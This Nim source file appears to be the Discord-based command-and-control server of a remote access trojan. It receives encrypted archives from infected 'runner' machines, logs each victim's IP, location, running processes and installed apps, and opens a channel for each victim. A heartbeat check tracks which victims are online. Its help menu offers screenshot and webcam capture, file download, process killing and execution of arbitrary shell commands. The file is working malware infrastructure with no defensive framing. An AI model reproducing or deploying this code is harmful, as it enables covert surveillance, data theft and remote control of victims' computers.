import dimscord_nossl, asyncdispatch, options, strutils, tables, times, random, json
import src/constants, src/decryptor, src/formatter

let discord = newDiscordClient(WatcherToken)
const heartbeatFmt = "yyyy-MM-dd HH:mm:ss 'CET'"
const cetOffset = initDuration(hours = 1)

proc parseHeartbeatTopic(topic: string): Option[Time] =
    let lower = topic.toLowerAscii()
    var prefixLen = -1
    for prefix in ["last heartbeat:", "last hearbeat:"]:
        if lower.startsWith(prefix):
            prefixLen = prefix.len
            break

    if prefixLen < 0: return none(Time)

    let ts = topic[prefixLen ..< topic.len].strip()

    if "|" in ts:
        let parts = ts.split("|")
        let last = parts[^1].strip()
        try:
            let epoch = parseInt(last).int64
            return some(fromUnix(epoch))
        except ValueError: discard

    try:
        let dt = parse(ts, heartbeatFmt, utc())
        return some(dt.toTime() - cetOffset)
    except CatchableError: discard

    none(Time)

proc countCategoryMembers(channels: seq[GuildChannel]): (int, int) =
    var online = 0
    var offline = 0

    for ch in channels:
        if ch.id == ActiveCategoryId or ch.id == OfflineCategoryId:
            continue

        if ch.parent_id.isNone: continue

        let parent = ch.parent_id.get()
        if parent == ActiveCategoryId: inc online
        elif parent == OfflineCategoryId: inc offline

    result = (online, offline)

proc updateCategoryLabels(channels: seq[GuildChannel], onlineCount, offlineCount: int) {.async.} =
    let onlineName = "🟢 Online [" & $onlineCount & "]"
    let offlineName = "🔴 Offline [" & $offlineCount & "]"

    for ch in channels:
        if ch.id == ActiveCategoryId:
            if ch.name != onlineName:
                try:
                    discard await discord.api.editGuildChannel(ch.id, name = some(onlineName))
                except CatchableError: discard
                await sleepAsync(500)
        elif ch.id == OfflineCategoryId:
            if ch.name != offlineName:
                try:
                    discard await discord.api.editGuildChannel(ch.id, name = some(offlineName))
                except CatchableError: discard
                await sleepAsync(500)

proc refreshCategoryLabels() {.async.} =
    let channels = await discord.api.getGuildChannels(TargetGuildId)
    let (onlineCount, offlineCount) = countCategoryMembers(channels)
    await updateCategoryLabels(channels, onlineCount, offlineCount)

var lastLabelUpdate = 0.0
proc throttledRefreshLabels() {.async.} =
    ## Avoid spamming category updates.
    let nowTs = epochTime()
    if nowTs - lastLabelUpdate < 15.0: return
    lastLabelUpdate = nowTs
    await refreshCategoryLabels()

proc extractSection(text: string, header: string): string =
    var lines = text.splitLines()
    var inSection = false
    var buf: seq[string] = @[]

    for line in lines:
        let t = line.strip()
        if t == header:
            inSection = true
            continue
        if inSection and t.startsWith("---"): break
        if inSection: buf.add(line)

    result = buf.join("\n").strip()

proc extractIpOnly(text: string): string =
    # 1. Try to extract explicit IP field from "IP: <value>" pattern
    if "IP:" in text:
        let parts = text.split("IP:")
        if parts.len > 1:
            var val = parts[1].strip()
            # Clean up markdown chars like ** or ()
            val = val.strip(chars = {'*', ' ', '\t', '(', ')', '[', ']'})
            # Take the first token
            let token = val.splitWhitespace()[0]
            # Remove trailing punctuation (commas from "IP: x, Country")
            return token.strip(chars = {',', '.'})

    # 2. Fallback: Matches common IPv4 patterns
    for token in text.split({' ', '\t', '\n', '\r', '(', ')', '[', ']', ',', ':', '*', '"'}):
        let trimmed = token.strip().strip(chars = {'*'})
        if trimmed.count('.') == 3:
            var isIp = true
            for part in trimmed.split('.'):
                if part.len == 0 or not part.allCharsInSet({'0'..'9'}):
                    isIp = false
                    break
            if isIp: return trimmed
    result = ""

proc withRateLimitRetry[T](op: proc(): Future[T] {.closure.}, label: string): Future[T] {.async.} =
    var attempt = 0
    while true:
        try:
            return await op()
        except CatchableError as e:
            if e.msg.toLowerAscii().contains("rate-limited") and attempt < 5:
                inc attempt
                let delayMs = 1000 * attempt
                echo "[429] Rate-limited during ", label, ". Retrying in ", delayMs, "ms..."
                await sleepAsync(delayMs)
            else:
                raise

proc handleRunnerPayload(m: Message, adj: Attachment) {.async.} =
    try:
        let startTs = epochTime()
        # Download, Decrypt, and Parse
        echo "[!] Processing payload: ", adj.filename, " (size: ", adj.size, " bytes)"
        let files = await decryptor.processPackage(adj.url)
        
        # Debugging: Log all files found in the package
        echo "[+] Files in package (", adj.filename, "): ", files.len
        
        # Check for command response manifest
        if files.hasKey("meta.json"):
            try:
                let meta = parseJson(files["meta.json"])
                let replyTo = meta["replyTo"].getStr()
                let fileName = meta["filename"].getStr()
                
                # Find the content file (anything that isn't meta.json)
                var content: string = ""
                for k, v in files:
                    if k != "meta.json":
                        content = v
                        break
                
                if content.len > 0:
                    discard await discord.api.sendMessage(replyTo, files = @[DiscordFile(name: fileName, body: content)])
                    echo "[+] Forwarded encrypted file ", fileName, " to ", replyTo
                else:
                    discard await discord.api.sendMessage(replyTo, "⚠️ **Error:** Decrypted package contained no content.")
            except CatchableError as e:
                echo "[!] Failed to parse/forward meta.json payload: ", e.msg
            return

        let locationFile = files.getOrDefault("location-system_info.txt", "")
        let procsFile = files.getOrDefault("running-processes.txt", "")
        let appsFile = files.getOrDefault("installed-apps.txt", "")

        var embedDesc = ""
        var stamp = ""
        
        if locationFile.len > 0:
            var lines: seq[string] = @[]
            for line in locationFile.splitLines():
                let stripped = line.strip()
                if stripped.len == 0: continue
                
                if stripped.toLowerAscii().startsWith("timestamp:"):
                    stamp = stripped
                elif stripped == "--- System Info ---": 
                    continue
                else:
                    lines.add(stripped)
            embedDesc = lines.join("\n")

        var ip = extractIpOnly(embedDesc)
        if ip.len == 0: ip = extractIpOnly(locationFile)
        if ip.len == 0: ip = "unknown"
        if embedDesc.len == 0: embedDesc = "### IP: " & ip

        echo "[+] Identified Runner IP: ", ip

        # Create/Find a channel for this Runner using the IP (dots -> dashes)
        let channel = await formatter.setupRunnerChannel(discord, ip)

        # Ensure channel is in Online category when connection is established
        try:
            discard await withRateLimitRetry(proc(): Future[GuildChannel] =
                discord.api.editGuildChannel(channel.id, parent_id = some(ActiveCategoryId))
            , "editGuildChannel(parent)")
        except CatchableError: discard

        asyncCheck throttledRefreshLabels()

        let embed = formatter.createIntelEmbed(embedDesc, stamp)
        var sentMsg: Option[Message] = none(Message)

        try:
            sentMsg = some(await withRateLimitRetry(proc(): Future[Message] =
                discord.api.sendMessage(channel.id, embeds = @[embed])
            , "sendMessage(embed)"))
        except CatchableError as e:
            discard await withRateLimitRetry(proc(): Future[Message] =
                discord.api.sendMessage(channel.id, "## ⚠️ Failed to send embed:\n" & e.msg)
            , "sendMessage(embed-error)")

        let filesToSend = @[
            DiscordFile(name: "running-processes.txt", body: (if procsFile.len > 0: procsFile else: "No process data collected.")),
            DiscordFile(name: "installed-apps.txt", body: (if appsFile.len > 0: appsFile else: "No installed applications data collected."))
        ]

        if sentMsg.isSome:
            # Create a thread "Files" under the embed message and upload files there
            try:
                let msg = sentMsg.get()
                let thread = await discord.api.startThreadWithMessage(
                    channel.id, 
                    msg.id, 
                    "Files", 
                    1440, # 24 hours archive duration
                    "Uploading runner logs"
                )
                
                discard await withRateLimitRetry(proc(): Future[Message] =
                    discord.api.sendMessage(thread.id, files = filesToSend)
                , "sendMessage(files-thread)")
                
                let elapsed = epochTime() - startTs
                echo "[+] Successfully processed and sent logs for Runner: ", ip, " (", formatFloat(elapsed, ffDecimal, 3), "s)"
            except CatchableError as e:
                echo "[!] Error creating thread or sending files for ", ip, ": ", e.msg
                # Fallback: send to main channel if thread fails
                try: 
                     discard await discord.api.sendMessage(channel.id, files = filesToSend)
                except: discard
        else:
             # Fallback if embed failed
             try:
                discard await withRateLimitRetry(proc(): Future[Message] =
                    discord.api.sendMessage(channel.id, files = filesToSend)
                , "sendMessage(files-fallback)")
             except CatchableError as e:
                echo "[!] Error sending results for ", ip, ": ", e.msg
    except CatchableError as e:
        echo "[!] Critical Error in handleRunnerPayload: ", e.msg
        echo e.getStackTrace()

proc heartbeatWatch() {.async.} =
    ## Poll channels and move them between online/offline categories based on last heartbeat topic.
    randomize()
    while true:
        let nowTs = getTime()
        let channels = await discord.api.getGuildChannels(TargetGuildId)

        var (onlineCount, offlineCount) = countCategoryMembers(channels)
        var moves: seq[tuple[id: string, dest: string, prev: string]] = @[]

        for ch in channels:
            # Skip categories themselves for move logic
            if ch.id == ActiveCategoryId or ch.id == OfflineCategoryId:
                continue

            let parent = if ch.parent_id.isSome: ch.parent_id.get() else: ""

            if ch.topic.isNone: continue
            let hb = parseHeartbeatTopic(ch.topic.get())
            if hb.isNone: continue

            let elapsed = nowTs - hb.get()
            let stale = elapsed.inSeconds > 420 # 7 minutes (allows for 6 min heartbeats)

            if stale and parent != OfflineCategoryId:
                moves.add((ch.id, OfflineCategoryId, parent))
            elif (not stale) and parent != ActiveCategoryId:
                moves.add((ch.id, ActiveCategoryId, parent))

        # Apply moves (best-effort) with throttling
        let maxMovesPerCycle = 5
        var applied = 0
        for mv in moves:
            if applied >= maxMovesPerCycle: break

            try:
                discard await discord.api.editGuildChannel(mv.id, parent_id = some(mv.dest))

                if mv.prev == ActiveCategoryId: dec onlineCount
                elif mv.prev == OfflineCategoryId: dec offlineCount

                if mv.dest == ActiveCategoryId: inc onlineCount
                elif mv.dest == OfflineCategoryId: inc offlineCount

                inc applied
            except CatchableError: discard

            await sleepAsync(750) # larger gap to avoid 429s

        await updateCategoryLabels(channels, onlineCount, offlineCount)

        let jitterMs = rand(5_000)
        await sleepAsync(60_000 + jitterMs) # poll ~60s with jitter

proc channelDelete(s: Shard, g: Option[Guild], c: Option[GuildChannel], d: Option[DMChannel]) {.event(discord).} =
    ## Immediately refresh counters when someone deletes a runner channel manually.
    if c.isNone: return
    if c.get.parent_id.isNone: return

    let parent = c.get.parent_id.get()
    if parent == ActiveCategoryId or parent == OfflineCategoryId:
        await refreshCategoryLabels()

proc onReady(s: Shard, r: Ready) {.event(discord).} =
    echo "Manager is online. Watching drop-zone: " & $DropzoneChannelId
    asyncCheck refreshCategoryLabels()
    asyncCheck heartbeatWatch()

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
    if m.author.bot and m.author.id == WatcherBotId: return # Don't reply to self

    # Watch the Dropzone for new runner archives
    if m.channel_id == DropzoneChannelId and m.attachments.len > 0:
        for adj in m.attachments:
            if adj.filename.endsWith(".dat") or adj.filename.endsWith(".zip"):
                echo "New runner data received: ", adj.filename
                asyncCheck handleRunnerPayload(m, adj)


                # Notify that the runner is ready for commands
                #discard await discord.api.sendMessage(channel.id, "\n## 🔗 Runner is listening to this channel.\n\tType \"`help`\" to see a list of available custom commands.")


    if m.content.strip().toLowerAscii() == "help":
        let helpText = """
## 🛠️ Available Custom Commands:
* `help` - get this message
* `info` - get updated system and location info
* `procs` - get running processes
* `apps` - get installed applications
* `screen` - take a screenshot
* `camera` - capture webcam image
* `dwn <path>` - download file from runner
* `pkill <pid>` *or* `<pname>` - terminate process
* `pmon`/`pmoff` - start/stop monitoring process (spawns/terminations)
* `clear <amount>` - delete X most recent messages
### Navigation aliases:
* `cd` - show current directory
* `cd home` - go to User home directory
* `cd desk` - go to Desktop
### ⚠️ Any other text will be executed as a Shell Command.
"""
        let response = Embed(
            #title: some("🛠️ Available Custom Commands"),
            description: some(helpText),
            color: some(0xFFFFFF) # White
        )
        discard await m.reply(embeds = @[response], mention = false)
        return


waitFor discord.startSession(gateway_intents = {giMessageContent, giGuildMessages})